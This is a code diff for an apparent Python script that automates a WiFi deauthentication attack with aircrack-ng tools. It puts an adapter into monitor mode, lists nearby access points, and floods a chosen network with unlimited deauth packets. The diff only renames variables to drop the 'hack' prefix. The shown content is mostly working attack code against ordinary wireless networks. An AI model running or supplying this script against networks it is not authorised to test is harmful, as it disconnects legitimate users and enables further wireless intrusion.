@@ -86,7 +86,7 @@ while True:
         print("Please enter a number that corresponds with the choices.")
 
 
-hacknic = check_wifi_result[int(wifi_interface_choice)]
+hnic = check_wifi_result[int(wifi_interface_choice)]
 
 
 print("WiFi adapter connected!\nNow let's kill conflicting processes:")
@@ -97,11 +97,11 @@ kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"
 
 
 print("Putting Wifi adapter into monitored mode:")
-put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hnic])
 
 
 
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hnic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 try:
@@ -150,15 +150,15 @@ while True:
         print("Please try again.")
 
 
-hackbssid = active_wireless_networks[int(choice)]["BSSID"]
-hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
+hbssid = active_wireless_networks[int(choice)]["BSSID"]
+hchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 
 
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+subprocess.run(["airmon-ng", "start", hnic + "mon", hchannel])
 
 
-subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
+subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
 
 
 try:
@@ -167,7 +167,7 @@ try:
 except KeyboardInterrupt:
     print("Stop monitoring mode")
     
-    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
+    subprocess.run(["airmon-ng", "stop", hnic + "mon"])
     print("Thank you! Exiting now")
 
 
